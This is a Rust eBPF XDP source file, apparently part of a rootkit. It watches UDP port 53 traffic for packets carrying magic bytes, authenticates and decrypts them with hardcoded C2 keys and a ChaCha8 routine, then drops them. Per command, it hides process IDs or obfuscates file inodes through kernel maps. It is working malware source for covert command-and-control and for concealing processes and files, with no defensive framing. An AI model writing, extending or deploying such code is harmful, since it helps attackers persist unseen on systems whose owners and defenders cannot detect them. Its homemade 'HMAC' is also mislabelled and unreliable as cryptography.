use aya_ebpf::{
    bindings::xdp_action, helpers::bpf_ktime_get_ns, macros::xdp, programs::XdpContext,
};
use common::{
    CommandPayload, EventHeader, C2_CHACHA20_KEY, CHACHA20_NONCE_LEN, EVENT_C2_AUTH_FAILED,
    EVENT_PACKET_INTERCEPTED, MAGIC_BYTES,
};
use core::mem;

use crate::maps::*;

const ETH_HDR_LEN: usize = 14;
const IP_HDR_LEN: usize = 20;
const UDP_HDR_LEN: usize = 8;
const ETH_P_IP: u16 = 0x0800;
const IPPROTO_UDP: u8 = 17;

#[xdp]
pub fn shadow_xdp(ctx: XdpContext) -> u32 {
    match try_shadow_xdp(&ctx) {
        Ok(action) => action,
        Err(_) => xdp_action::XDP_PASS,
    }
}

fn try_shadow_xdp(ctx: &XdpContext) -> Result<u32, i64> {
    let data = ctx.data();
    let data_end = ctx.data_end();

    let encrypted_min_len = ETH_HDR_LEN
        + IP_HDR_LEN
        + UDP_HDR_LEN
        + 4
        + CHACHA20_NONCE_LEN
        + mem::size_of::<CommandPayload>()
        + 16;
    let legacy_min_len =
        ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN + 4 + mem::size_of::<CommandPayload>() + 16;
    if data + legacy_min_len > data_end {
        return Ok(xdp_action::XDP_PASS);
    }

    let eth_proto = unsafe {
        let ptr = data as *const u8;
        u16::from_be(*(ptr.add(12) as *const u16))
    };
    if eth_proto != ETH_P_IP {
        return Ok(xdp_action::XDP_PASS);
    }

    let ip_start = data + ETH_HDR_LEN;
    let ip_proto = unsafe { *(ip_start as *const u8).add(9) };
    if ip_proto != IPPROTO_UDP {
        return Ok(xdp_action::XDP_PASS);
    }

    let udp_start = ip_start + IP_HDR_LEN;
    let dst_port = unsafe { u16::from_be(*((udp_start as *const u8).add(2) as *const u16)) };

    if dst_port != 53 {
        return Ok(xdp_action::XDP_PASS);
    }

    let payload_start = udp_start + UDP_HDR_LEN;
    let magic = unsafe {
        let ptr = payload_start as *const [u8; 4];
        *ptr
    };

    if magic != MAGIC_BYTES {
        return Ok(xdp_action::XDP_PASS);
    }

    let is_encrypted = data + encrypted_min_len <= data_end;

    let cmd = if is_encrypted {
        let nonce_start = payload_start + 4;
        let nonce: [u8; 12] = unsafe {
            let ptr = nonce_start as *const [u8; 12];
            *ptr
        };

        let enc_payload_start = nonce_start + CHACHA20_NONCE_LEN;
        let mac_start = enc_payload_start + mem::size_of::<CommandPayload>();

        let received_mac = unsafe {
            let ptr = mac_start as *const [u8; 16];
            *ptr
        };
        let computed_mac = compute_c2_hmac(
            payload_start as *const u8,
            4 + CHACHA20_NONCE_LEN + mem::size_of::<CommandPayload>(),
        );
        if received_mac != computed_mac {
            let event = EventHeader {
                event_type: EVENT_C2_AUTH_FAILED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: 1,
            };
            let _ = EVENTS.output(&event, 0);
            return Ok(xdp_action::XDP_PASS);
        }

        let keystream = chacha8_block(&C2_CHACHA20_KEY, &nonce, 0);

        let mut enc_bytes: [u8; 16] = [0u8; 16];
        unsafe {
            let src = enc_payload_start as *const u8;
            let mut i = 0usize;
            while i < 16 {
                enc_bytes[i] = *src.add(i);
                i += 1;
            }
        }

        let mut dec_bytes: [u8; 16] = [0u8; 16];
        let mut i = 0usize;
        while i < 16 {
            dec_bytes[i] = enc_bytes[i] ^ keystream[i];
            i += 1;
        }

        unsafe { *(dec_bytes.as_ptr() as *const CommandPayload) }
    } else {
        let hmac_start = payload_start + 4 + mem::size_of::<CommandPayload>();
        let received_hmac = unsafe {
            let ptr = hmac_start as *const [u8; 16];
            *ptr
        };
        let computed_hmac = compute_c2_hmac(
            payload_start as *const u8,
            4 + mem::size_of::<CommandPayload>() as usize,
        );
        if received_hmac != computed_hmac {
            let event = EventHeader {
                event_type: EVENT_C2_AUTH_FAILED,
                pid: 0,
                timestamp_ns: unsafe { bpf_ktime_get_ns() },
                context: 0,
            };
            let _ = EVENTS.output(&event, 0);
            return Ok(xdp_action::XDP_PASS);
        }

        unsafe {
            let cmd_ptr = (payload_start + 4) as *const CommandPayload;
            *cmd_ptr
        }
    };

    match cmd.cmd_type {
        1 => {
            let pid = cmd.arg1;
            let _ = HIDDEN_PIDS.insert(&pid, &1u8, 0);
        }
        2 => {
            let pid = cmd.arg1;
            let _ = HIDDEN_PIDS.remove(&pid);
        }
        3 => {
            let inode = cmd.arg1 as u64;
            let _ = OBFUSCATE_INODES.insert(&inode, &1u8, 0);
        }
        5 => {}
        _ => {}
    }

    let event = EventHeader {
        event_type: EVENT_PACKET_INTERCEPTED,
        pid: cmd.cmd_type,
        timestamp_ns: unsafe { bpf_ktime_get_ns() },
        context: cmd.arg1 as u64,
    };
    let _ = EVENTS.output(&event, 0);

    Ok(xdp_action::XDP_DROP)
}

#[inline(always)]
fn compute_c2_hmac(data: *const u8, len: usize) -> [u8; 16] {
    let mut mac = common::C2_HMAC_KEY;
    let max_len = if len > 64 { 64 } else { len };
    for i in 0..64usize {
        if i >= max_len {
            break;
        }
        let byte = unsafe { *data.add(i) };
        mac[i % 16] ^= byte;
        mac[i % 16] = mac[i % 16].wrapping_add(byte).rotate_left(3);
    }
    mac
}

#[inline(always)]
fn chacha_quarter_round(state: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(16);

    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(12);

    state[a] = state[a].wrapping_add(state[b]);
    state[d] ^= state[a];
    state[d] = state[d].rotate_left(8);

    state[c] = state[c].wrapping_add(state[d]);
    state[b] ^= state[c];
    state[b] = state[b].rotate_left(7);
}

#[inline(always)]
fn chacha8_block(key: &[u8; 32], nonce: &[u8; 12], counter: u32) -> [u8; 64] {
    let mut state: [u32; 16] = [
        0x61707865,
        0x3320646e,
        0x79622d32,
        0x6b206574,
        u32::from_le_bytes([key[0], key[1], key[2], key[3]]),
        u32::from_le_bytes([key[4], key[5], key[6], key[7]]),
        u32::from_le_bytes([key[8], key[9], key[10], key[11]]),
        u32::from_le_bytes([key[12], key[13], key[14], key[15]]),
        u32::from_le_bytes([key[16], key[17], key[18], key[19]]),
        u32::from_le_bytes([key[20], key[21], key[22], key[23]]),
        u32::from_le_bytes([key[24], key[25], key[26], key[27]]),
        u32::from_le_bytes([key[28], key[29], key[30], key[31]]),
        counter,
        u32::from_le_bytes([nonce[0], nonce[1], nonce[2], nonce[3]]),
        u32::from_le_bytes([nonce[4], nonce[5], nonce[6], nonce[7]]),
        u32::from_le_bytes([nonce[8], nonce[9], nonce[10], nonce[11]]),
    ];

    let initial_state = state;

    for _ in 0..4u32 {
        chacha_quarter_round(&mut state, 0, 4, 8, 12);
        chacha_quarter_round(&mut state, 1, 5, 9, 13);
        chacha_quarter_round(&mut state, 2, 6, 10, 14);
        chacha_quarter_round(&mut state, 3, 7, 11, 15);
        chacha_quarter_round(&mut state, 0, 5, 10, 15);
        chacha_quarter_round(&mut state, 1, 6, 11, 12);
        chacha_quarter_round(&mut state, 2, 7, 8, 13);
        chacha_quarter_round(&mut state, 3, 4, 9, 14);
    }

    let mut i = 0;
    while i < 16 {
        state[i] = state[i].wrapping_add(initial_state[i]);
        i += 1;
    }

    let mut output = [0u8; 64];
    let mut j = 0;
    while j < 16 {
        let bytes = state[j].to_le_bytes();
        output[j * 4] = bytes[0];
        output[j * 4 + 1] = bytes[1];
        output[j * 4 + 2] = bytes[2];
        output[j * 4 + 3] = bytes[3];
        j += 1;
    }
    output
}
